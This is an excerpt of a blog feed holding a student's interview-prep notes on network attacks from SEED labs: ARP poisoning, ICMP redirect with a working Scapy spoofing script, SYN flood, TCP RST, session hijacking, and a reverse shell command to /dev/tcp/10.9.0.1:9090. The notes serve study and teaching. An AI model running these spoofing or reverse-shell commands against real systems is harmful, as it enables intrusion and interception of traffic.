item i and the remaining capacity p. The capacity constraint is {1, 2,
‚Ä¶, i}, which corresponds to the largest possible subset of items.</li>
<li><strong>State Transition: i = 1:</strong> <span
class="math inline">\(Val(1, p) =
\begin{cases}
0, &amp; 0 \leq p &lt; w_1 \\
v_1, &amp; p \geq w_1
\end{cases}\)</span> <strong>i &gt; 1:</strong> <span
class="math inline">\(Val(i, p) =
\begin{cases}
Val(i-1, p), &amp; 0 \leq p &lt; w_i \\
\max(Val(i-1, p), Val(i-1, p - w_i) + v_i), &amp; p \geq w_i
\end{cases}\)</span> where <span class="math inline">\(w_i\)</span> is
the weight of item <span class="math inline">\(i\)</span>, and <span
class="math inline">\(v_i\)</span> is the value of item <span
class="math inline">\(i\)</span>.</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm Design and Analysis</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Layer Protocols and Web Security_1</title>
    <url>/2025/03/13/Network-Layer-Protocols-and-Web-Security-1/</url>
    <content><![CDATA[<blockquote>
<p>for my X interview, basically focus on the Computer networks. I really recommend the Neso Academy lesson. And this note also included some seed labs content.</p>
</blockquote>
<h1 id="1-ARP‚Äî‚ÄîAddress-Resolution-Protocol"><a href="#1-ARP‚Äî‚ÄîAddress-Resolution-Protocol" class="headerlink" title="1. ARP‚Äî‚ÄîAddress Resolution Protocol"></a>1. ARP‚Äî‚ÄîAddress Resolution Protocol</h1><aside>
üí°

IP Address‚ÜíMAC Address (Resolving IPv4 addresses to Mac addresses and maintaining a table of mappings)

</aside>

<p>Reverse ARP(RARP)</p>
<h2 id="1-1-ARP-Cache-Poisoning-Attack-Lab"><a href="#1-1-ARP-Cache-Poisoning-Attack-Lab" class="headerlink" title="1.1 ARP Cache Poisoning Attack Lab"></a>1.1 ARP Cache Poisoning Attack Lab</h2><p>ARP protocol is a very simple protocol, and it does not implement any security measure. Under such attack, attackers can fool the victim into accepting forged IP to Mac mapping (redirect).</p>
<p><a href="https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf">seedsecuritylabs.org</a></p>
<h3 id="1-1-1-How-to-implement-ARP-Cache-Poisoning"><a href="#1-1-1-How-to-implement-ARP-Cache-Poisoning" class="headerlink" title="1.1.1 How to implement ARP Cache Poisoning?"></a>1.1.1 How to implement ARP Cache Poisoning?</h3><ul>
<li>By using ARP request</li>
<li>By using ARP reply, the ARP Cache table need certain IP address. As the result, it‚Äôs a reply not a request</li>
<li>By using ARP gratuitous message. An <strong>ARP Gratuitous packet</strong> is a special type of <strong>ARP request packet</strong>. When a host needs to update outdated information in the ARP caches of all other hosts, it uses this packet. It does not expect the reply.<ul>
<li>the <code>src_ip == dst_ip</code> is the certain host ip</li>
<li>In the ARP head and Ether head, the <code>dst_mac==ff:ff:ff:ff:ff:ff</code></li>
</ul>
</li>
</ul>
<h3 id="1-1-2-Man-in-the-Middle-Attack-on-Telnet-using-ARP-Cache-Poisoning"><a href="#1-1-2-Man-in-the-Middle-Attack-on-Telnet-using-ARP-Cache-Poisoning" class="headerlink" title="1.1.2 Man in the Middle Attack on Telnet using ARP Cache Poisoning"></a>1.1.2 Man in the Middle Attack on <code>Telnet</code> using ARP Cache Poisoning</h3><p><img src="attachment:c104508d-63ce-4977-8be1-745241b009ca:image.png" alt="image.png"></p>
<ol>
<li><strong>Launch the ARP cache poisoning attack.</strong> In A‚Äôs ARP cache, B‚Äôs IP address is mapped to M‚Äôs MAC address, and in B‚Äôs ARP cache, A‚Äôs IP address is also mapped to M‚Äôs MAC address.</li>
<li><strong>Testing:</strong> using Ping, make sure you close ip forward function. Because if IP forwarding is enabled on M, it will act like legitimate router. <strong>Disable IP forwarding</strong> ‚Üí Ensures that A and B <strong>cannot communicate</strong>, proving ARP poisoning was successful.</li>
<li><strong>Launch the MITM attack:</strong> This time make sure you open the ip forward forwarding. <strong>Enable IP forwarding</strong> ‚Üí Creates a <strong>Man-in-the-Middle (MITM) attack</strong>, where M forwards packets while spying on or modifying the traffic. Such as: change packet payload. </li>
</ol>
<p>Telnet: <strong>Telnet</strong> (short for <strong>Telecommunication Network</strong>) is a <strong>network protocol and command-line tool.</strong> Telnet allows a user to log into a remote system, enabling them to execute commands on that system. It relies on the TCP protocol. </p>
<h3 id="1-1-3-Man-in-the-Middle-Attack-on-Netcat-using-ARP-Cache-Poisoning"><a href="#1-1-3-Man-in-the-Middle-Attack-on-Netcat-using-ARP-Cache-Poisoning" class="headerlink" title="1.1.3 Man in the Middle Attack on Netcat using ARP Cache Poisoning"></a>1.1.3 Man in the Middle Attack on <code>Netcat</code> using ARP Cache Poisoning</h3><p>the host A and B use Netcat to communicate instead of Telnet. </p>
<ul>
<li><strong>Telnet is mainly for remote login</strong> (like SSH but without encryption).</li>
<li><strong>Netcat is a general-purpose networking tool</strong> that supports TCP/UDP, port scanning, file transfer, and even creating a backdoor.</li>
<li><strong>Netcat is more powerful</strong> and is often used for <strong>network troubleshooting, hacking (pentesting), and automation</strong>.</li>
</ul>
]]></content>
      <categories>
        <category>Interview preparation</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Layer Protocols and Web Security_2</title>
    <url>/2025/03/13/Network-Layer-Protocols-and-Web-Security-2/</url>
    <content><![CDATA[<blockquote>
<p>for my X interview, basically focus on the Computer networks. I
really recommend the Neso Academy lesson. And this note also included
some seed labs content.</p>
</blockquote>
<h1 id="icmpicmpv4-icmpv6internet-control-message-protocol">2.
ICMP(ICMPv4 &amp;&amp; ICMPv6)‚Äî‚ÄîInternet Control Message Protocol</h1>
<p>ICMP is a supporting protocol in the Internet protocol suite. This
protocol defines a collection of error messages that are sent back to
the source host whenever a router or host is unable to process an IP
packet successfully.</p>
<p>ICMP redirect: from router to a source host, with better route
information</p>
<h2 id="icmp-redirect-attack-lab">2.1 ICMP Redirect Attack Lab</h2>
<figure>
<img src="attachment:40208da1-9220-4929-814d-7251e9980ad0:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="launching-icmp-redirect-attack">2.1.1 Launching ICMP Redirect
Attack</h3>
<p>In the ubuntu os, there is countermeasure against the ICMP redirect
attack, we need to configure the victim host to accept ICMP redirect
message. ICMP redirect message will not affect the routing table;
instead, it affects the routing cache. Entries in the routing cache
overwrite those in the routing table, until the entries expire.</p>
<p>If we spoof redirect packets, but the victim machine has not sent out
ICMP packets during the attack, the attack will never be successful.
This is because the OS kernel conducts some kind of sanity check before
accepting an ICMP redirect packets. It verifies whether the ICMP
redirect is triggered by the packet it sent out, i.e., it inspects the
ip2 inside the redirect packet. How strictly the checking is conducted
depends on the OS.</p>
<p>you can write a script by using <code>scapy</code> library to
redirect on the Malicious Router:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">ip = IP(src = <span class="string">&#x27;10.9.0.11&#x27;</span>, dst = <span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">icmp = ICMP(type=<span class="number">5</span>, code=<span class="number">1</span>)</span><br><span class="line">icmp.gw = <span class="string">&#x27;10.9.0.111&#x27;</span></span><br><span class="line"></span><br><span class="line"># The enclosed IP packet should be the one that</span><br><span class="line"><span class="meta"># triggers the redirect message.</span></span><br><span class="line">ip2 = IP(src = <span class="string">&#x27;10.9.0.5&#x27;</span>, dst = <span class="string">&#x27;192.168.60.5&#x27;</span>)</span><br><span class="line">send(ip/icmp/ip2/ICMP());</span><br></pre></td></tr></table></figure>
<figure>
<img src="attachment:c2ab5fdd-613c-4e25-8bc0-0b19b546dcc6:image.png"
alt="p1_attack before" />
<figcaption aria-hidden="true">p1_attack before</figcaption>
</figure>
<p>p1_attack before</p>
<figure>
<img src="attachment:6bcbf8dc-4344-4e7c-a890-2d9273d33cd4:image.png"
alt="p2_attack after" />
<figcaption aria-hidden="true">p2_attack after</figcaption>
</figure>
<p>p2_attack after</p>
<p><em><strong>Question 1:</strong> Can you use ICMP redirect attacks to
redirect to a remote machine? Namely, the IP address assigned to <a
href="http://icmp.gw/">icmp.gw</a> is a computer not on the local LAN.
Please show your experiment result, and explain your
observation.</em></p>
<p>change the script:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">icmp.gw = <span class="string">&#x27;192.168.60.6&#x27;</span></span><br></pre></td></tr></table></figure>
<p>the result is no difference‚Äî‚Äîjust like p1_attack before</p>
<p><em><strong>Question 2:</strong> Can you use ICMP redirect attacks to
redirect to a non-existing machine on the same network? Namely, the IP
address assigned to <a href="http://icmp.gw/">icmp.gw</a> is a local
computer that is either offline or non-existing. Please show your
experiment result, and explain your observation.</em></p>
<p>change the script: a non-exit icmp.gw</p>
<p>the result is no difference‚Äî‚Äîjust like p1_attack before</p>
<p><em><strong>Question 3:</strong> If you look at the
docker-compose.yml file, you will find the following entries for the
malicious router container. What are the purposes of these entries?
Please change their value to 1, and launch the attack again. Please
describe and explain your observation.</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sysctls:</span><br><span class="line">- net.ipv4.conf.all.send_redirects=<span class="number">0</span></span><br><span class="line">- net.ipv4.conf.<span class="keyword">default</span>.send_redirects=<span class="number">0</span></span><br><span class="line">- net.ipv4.conf.eth0.send_redirects=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>the attack fail</p>
<p>why???</p>
<h3 id="launching-the-mitm-attack">2.1.2 Launching the MITM Attack</h3>
<p>Using the ICMP redirect attack, we can get the victim to use our
malicious router (10.9.0.111) as the router for the destination
192.168.60.5. Therefore, all packets from the victim machine to this
destination will be routed through the malicious router. We would like
to modify the victim‚Äôs packets.</p>
<p>Before launching the MITM attack, we start a TCP client and server
program using netcat.</p>
<ol type="1">
<li>Disabling IP Forwarding. In the setup, the malicious router‚Äôs IP
forwarding is enabled, so it does function like a router and forward
packets for others. When we launch the MITM attack, we have to stop
forwarding IP packets; instead, we will intercept the packet, make a
change, and send out a new packet. To do that, we just need to disable
the IP forwarding on the malicious router.
<code>net.ipv4.ip_forward=0</code></li>
<li>write <a href="http://icmp.py">icmp.py</a> script, the same like
before</li>
<li>write MITM code: Once the IP forwarding is disabled, our program
needs to take over the role of packet forwarding from the victim to the
target, of course after making changes to the packets. Since the
packet‚Äôs destination is not for us, the kernel will not give the packet
to us; it will simply drops the packet. However, if our program is a
sniffer program, we will get the packet from the kernel. Therefore, we
will use the sniffand-spoof technique to implement this MITM attack. you
can change the information that sent by the victim host.</li>
</ol>
<p><em><strong>Question 4:</strong> In your MITM program, you only need
to capture the traffics in one direction.Please indicate which
direction, and explain why.</em></p>
<p><em><strong>Question 5:</strong> In the MITM program, when you
capture the nc traffics from A (10.9.0.5), you can use A‚Äôs IP address or
MAC address in the filter. One of the choices is not good and is going
to create issues, even though both choices may work. Please try both,
and use your experiment results to show which choice is the correct one,
and please explain your conclusion.</em></p>
]]></content>
      <categories>
        <category>Interview preparation</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Transport Layer Protocols and Web Security</title>
    <url>/2025/03/14/Transport-Layer-Protocols-and-Web-Security/</url>
    <content><![CDATA[<blockquote>
<p>for my X interview, basically focus on the Computer networks. I
really recommend the Neso Academy lesson. And this note also included
some seed labs content.</p>
</blockquote>
<h1 id="transport-layer">1. Transport Layer</h1>
<p>It is responsible for process to process delivery of the entire
message.</p>
<p>Services provided by transport layer</p>
<ul>
<li>Port addressing</li>
<li>Segmentation and Reassembly</li>
<li>Connection Control</li>
<li>Flow Control</li>
<li>Error Control</li>
</ul>
<figure>
<img src="attachment:dcc47129-c0e3-4086-8ba5-4c34213be94f:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="port-addressing">1.1 Port addressing</h2>
<ul>
<li>The <strong>IP address</strong> identifies a device. The
<strong>port number(16 bit)</strong> identifies a specific process. A
port is identifies for each transport protocol.</li>
<li>Port numbers also in the uniform resource locators(URLs)</li>
</ul>
<h2 id="transport-layer-protocolstcp-and-udp">1.2 Transport Layer
Protocols‚Äî‚ÄîTCP and UDP</h2>
<h3 id="tcp-udp">1.2.1 TCP &amp;&amp; UDP</h3>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr>
<th></th>
<th>UDP</th>
<th>TCP</th>
</tr>
</thead>
<tbody>
<tr>
<td>Full name</td>
<td>User Datagram Protocol</td>
<td>Transmission Control Protocol</td>
</tr>
<tr>
<td>Used by</td>
<td>Used by applications that cannot tolerate small loss of data and can
tolerate delay:</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Domain Name System(DNS)</strong> <strong>Dynamic Host
Configuration Protocol(DHCP)</strong> Online games | Used by applicants
that can tolerate delay but cannot tolerate loss: HTTP FTP Telnet SMTP |
| Error control | NO | Yes | | Flow control | NO | Yes | | Connection
Control | Connectionless and unreliable | Connection and reliable | |
Header fields | simple | complicated |</p>
<h3 id="phases-of-tcp-transmission">1.2.2 <strong>3 Phases of TCP
Transmission</strong></h3>
<p><strong>TCP Connection establishment:</strong> Three-Way
Handshaking</p>
<ul>
<li><strong>SYN</strong> ‚Üí Client sends a <strong>SYN (synchronize)
packet</strong> to the server, requesting a connection.</li>
<li><strong>SYN-ACK</strong> ‚Üí Server responds with
<strong>SYN-ACK</strong>, acknowledging the request.</li>
<li><strong>ACK</strong> ‚Üí Client replies with <strong>ACK</strong>,
confirming the connection.</li>
</ul>
<p><strong>Data Transfer:</strong> TCP ensures <strong>reliable and
ordered</strong> data transmission</p>
<ul>
<li>flow control: TCP uses a sliding window to handle flow control.
Between Go-Back-N protocol and Selective repeat. And the sliding window
size is dynamic.</li>
<li>Congestion control: The sender have the congestion window determined
by the receiver but also by the congestion in the network. The size is
dynamic. Not only the congestion window but also have congestion policy.
The congestion policy based on 3 phases. The slow start(starts with a
very slow rate of transmission); congestion avoidance(after reached the
threshold); The congestion detection(return to other phase)</li>
</ul>
<p><strong>Connection Termination:</strong> Four-Way Handshaking</p>
<ul>
<li><strong>FIN</strong> ‚Üí Client sends a <strong>FIN (finish)</strong>
request to end communication.</li>
<li><strong>ACK</strong> ‚Üí Server acknowledges the request.</li>
<li><strong>FIN</strong> ‚Üí Server also sends a <strong>FIN</strong>,
indicating it‚Äôs ready to close.</li>
<li><strong>ACK</strong> ‚Üí Client sends a final <strong>ACK</strong>,
confirming the termination.</li>
</ul>
<h1 id="attacks-on-tcpip-protocols">2. Attacks on TCP/IP Protocols</h1>
<blockquote>
<p>In the computer networks security class, we use <code>netwox</code>
tool to implement ARP cache poisoning attack, ICMP redirect attack</p>
</blockquote>
<h2 id="syn-flooding-attack">2.1 SYN Flooding Attack</h2>
<p>SYN flood is a form of DoS attack in which attackers send many SYN
requests to a victim‚Äôs TCP port, but the attackers have no intention to
finish the 3-way handshake procedure. In the TCP establish phase.
Attackers either use spoofed IP address or do not continue the
procedure. Through this attack, attackers can flood the victim‚Äôs queue
that is used for half-opened connections, i.e. the connections that has
finished SYN, SYN-ACK, but has not yet gotten a final ACK back. When
this queue is full, the victim cannot take any more connection. Figure 2
illustrates the attack.</p>
<figure>
<img src="attachment:4c608475-64f1-440e-8530-c0978b1c7db5:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>close the <strong>SYN Cookie Countermeasure.</strong> The server will
discards the SYN entry. If the server later receives an ACK response
from the client, it can use the cookie to reconstruct the SYN queue
entry.</p>
<h2 id="tcp-rst-attacks-on-telnet-connectionsssh">2.2 TCP RST Attacks on
telnet Connections/ssh</h2>
<p>The TCP RST Attack can terminate an established TCP connection
between two victims. For example, if there is an established telnet
connection (TCP) between two users A and B, attackers can spoof a RST
packet from A to B, breaking this existing connection. To succeed in
this attack, attackers need to correctly construct the TCP RST
packet.</p>
<aside>
<p>üí°</p>
<p>Launching the attack manually. Please use Scapy to conduct the TCP
RST attack. A skeleton code is provided in the following.</p>
</aside>
<aside>
<p>üí°</p>
<p>Launching the attack by <code>netwox</code>.</p>
</aside>
<p>you can also use this kind of attack to break the TCP connection
between a host and the video streaming applicants.</p>
<h2 id="tcp-session-hijacking">2.3 TCP Session Hijacking</h2>
<p>The objective of the TCP Session Hijacking attack is to hijack an
existing TCP connection (session) between two victims by injecting
malicious contents into this session. If this connection is a telnet
session, attackers can inject malicious commands (e.g. deleting an
important file) into this session, causing the victims to execute the
malicious commands. Figure 3 depicts how the attack works. In this task,
you need to demonstrate how you can hijack a telnet session between two
computers. Your goal is to get the telnet server to run a malicious
command from you. For the simplicity of the task, we assume that the
attacker and the victim are on the same LAN.</p>
<aside>
<p>üí°</p>
<p>Launching the attack manually. Please use Scapy to conduct the TCP
Session Hijacking attack. A skeleton code is provided in the
following.</p>
</aside>
<aside>
<p>üí°</p>
<p>Launching the attack by <code>netwox</code>.</p>
</aside>
<figure>
<img src="attachment:57a2e589-e8f1-4cfc-9fb1-148f012a8a8b:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li><strong>Sniffing the Network Traffic</strong>:¬†The attacker listens
to the communication between A and B, capturing the ongoing TCP session,
including the <strong>IP addresses</strong>, <strong>TCP sequence
numbers</strong>, and <strong>ACK numbers</strong>.</li>
<li><strong>Sending Spoofed Packets</strong>: The attacker
<strong>forges a TCP packet</strong> that appears to come from B (by
using B‚Äôs IP address and the correct sequence numbers). The packet will
be crafted to look like a legitimate response to A.</li>
</ul>
<h2 id="creating-reverse-shell-using-tcp-session-hijacking">2.4 Creating
Reverse Shell using TCP Session Hijacking</h2>
<p>When attackers are able to inject a command to the victim‚Äôs machine
using TCP session hijacking, they are not interested in running one
simple command on the victim machine, they are interested in running
many commands. Obviously, running all these commands all through TCP
session hijacking is inconvenient. What attackers want to achieve is to
use the attack to set up a back door, so they can use this back door to
conveniently conduct further damages.</p>
<p>A typical way to set up back doors is to run a reverse shell from the
victim machine. Reverse shell is a shell process running on a remote
machine, connecting back to the attacker‚Äôs machine. This gives an
attacker a convenient way to access a remote machine once it has been
compromised.</p>
<p>In the following, we will show how we can set up a reverse shell if
we can directly run a command on the victim machine. In the TCP session
hijacking attack, attackers cannot directly run a command on the victim
machine, so their jobs is to run a reverse-shell command through the
session hijacking attack.</p>
<aside>
<p>üí°</p>
<p>In the summary</p>
<ul>
<li><strong>TCP session hijacking</strong> is used to <strong>inject
malicious commands</strong> into an existing session.</li>
<li>The ultimate goal is to <strong>establish a reverse shell</strong>
that provides <strong>remote access</strong> to the compromised system.
Once the reverse shell is set up, the attacker can use it to execute
further commands and achieve long-term control over the victim
machine.</li>
</ul>
</aside>
<figure>
<img src="attachment:3a5c5e39-be6a-4249-89d8-a8da1e3d4d59:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>In summery,
<code>"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1‚Äù</code>
(and this is a <strong>Reverse Shell Command)</strong> starts a bash
shell, with its input coming from a tcp connection, and its standard and
error outputs being redirected to the same tcp connection.</p>
]]></content>
      <categories>
        <category>Interview preparation</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
</search>
